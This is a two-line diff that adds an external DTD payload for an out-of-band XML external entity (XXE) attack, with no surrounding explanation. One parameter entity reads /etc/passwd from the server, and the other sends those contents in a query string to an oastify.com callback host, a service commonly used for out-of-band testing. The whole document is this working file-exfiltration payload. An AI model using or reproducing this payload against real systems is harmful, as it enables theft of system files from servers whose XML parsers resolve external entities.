@@ -1,0 +1,2 @@
+<!ENTITY % data SYSTEM "file:///etc/passwd">
+<!ENTITY % send SYSTEM "http://435joprysj76ehv0q9knveajxa31ryfn.oastify.com/?data=%data;">
